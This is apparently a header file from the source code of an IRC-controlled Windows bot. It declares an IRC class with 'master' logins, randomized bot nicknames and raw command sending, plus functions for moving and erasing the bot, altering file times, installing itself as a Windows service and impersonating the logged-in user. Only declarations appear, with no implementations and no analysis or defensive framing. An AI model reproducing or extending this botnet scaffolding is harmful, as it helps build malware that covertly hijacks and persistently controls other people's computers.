
#if !defined(IRC_H__INCLUDED_)
#define IRC_H__INCLUDED_

#include <stdarg.h>

enum {
	N_OS,
	N_RNDLTR,
	N_RNDCTY,
	N_BOX,
	N_MINE,
};

struct irc_reply_data
{
	char* nick;
	char* ident;
	char* host;
	char* target;
};

struct irc_command_hook
{
	char* irc_command;
	int (*function)(char*, irc_reply_data*, void*);
	irc_command_hook* next;
};

struct logged_in
{
	char nick[MAX_NICKLEN];
	char ident[MAX_NICKLEN];
	char host[MAX_HOSTNAME];
};
DWORD WINAPI PingTimeoutThread(LPVOID param);

class IRC
{
public:
	IRC();
	~IRC();
	int start(char* server, int port, char* nick, char* user, char* name, char* pass);
	void disconnect();
	int notice(char* target, char* message, ...);
	int pmsg(char* target, char* message, ...);
	int privmsg_filter(char* target, char *filter, char* message, ...);
	int join(char* channel);
	int join(char* channel, char* pass);
	int part(char* channel);
	int mode(char* modes);
	int mode(char* channel, char* modes, char* targets);
	int nick(char* newnick);
	int quit(char* quit_message, ...);
	int raw(char* data);
	void hook_irc_command(char* cmd_name, int (*function_ptr)(char*, irc_reply_data*, void*));
	int message_loop();
	char* current_nick();
	bool  is_connected(void);
	bool  should_connect(void);
	char* nickgen(DWORD NickType, int NickLen);
	char* get_ip(void);
	SOCKET get_sock(void);

	void clear_logins(void);
	int add_login(const char* nick, const char* ident, const char* host);
	int del_login(const char* nick, const char* ident, const char* host);
	BOOL del_login(int num);
	BOOL is_logged_in(const char* nick, const char* ident, const char* host);
	BOOL has_master(void);
	void list_logins(char* target);
	int privmsg_masters(char* message, ...);
	int get_nicktime(void) { return nicktime; }

private:
	char* nickgen_mine(void);
	char* nickgen_prefix(void);
	char* nickgen_os(void);
	char* nickgen_rndltr(void);
	char* nickgen_rndcountry(void);
	char* nickgen_curbox(void);
	int isend(int socket, char *data, ...);
	void call_hook(char* irc_command, char*params, irc_reply_data* hostd);
	void parse_irc_reply(char* data);
	void split_to_replies(char* data);
	void insert_irc_command_hook(irc_command_hook* hook, char* cmd_name, int (*function_ptr)(char*, irc_reply_data*, void*));
	void delete_irc_command_hook(irc_command_hook* cmd_hook);
	int isock;
	bool connected;
	bool bconnect;
	char* cur_nick;
	char ip[MAX_IP];
	irc_command_hook* hooks;
	int nicklen;
	int nicktime;
	BOOL prefixmrc;
	BOOL prefixprv;
	BOOL prefixdialup;

};

#endif
///////////////////////////////////////////////////////////////////
//
///////////////////////////////////////////////////////////////////
char *substr(char *input, int start, int end);
char *replacestr(char *str, const char *substr, const char *repstr);

BOOL FileExists(LPSTR lpszFilename);
BOOL IsFolder(LPSTR lpszFilename);

size_t FileSize(const char *filename);
int SplitParams(char *a[MAX_TOKENS],char *line,int depth);
int SplitSwitches(char *a[MAX_TOKENS],unsigned char *s[MAX_TOKENS]);
BOOL SetFileTime(char *Filename);
BOOL MoveBot(char *MTP,char *Bname);
int wildcardfit(char *wildcard, char *test);
void GetInstalledTime(void);
void EraseMe(BOOL nopause=FALSE);
void uninstall(BOOL thread=FALSE, BOOL difbot=FALSE);
char *commaI64(unsigned __int64 number);
char *commaI64(unsigned __int64 number, char *str);
BOOL IsServiceRunning(char *name);
void RemoveCompleteDirectory(char* path);
///////////////////////////////////////////////////////////////////
//
///////////////////////////////////////////////////////////////////
#ifndef NO_SERVICE
void ImpersonateInteractiveUser(void);
#endif
#ifndef NO_SERVICE
int ServiceRun();
int InstallService(char *spath);
int ServiceMain(int argc, char *argv[]);
DWORD WINAPI ServiceThread(LPVOID param);
#endif
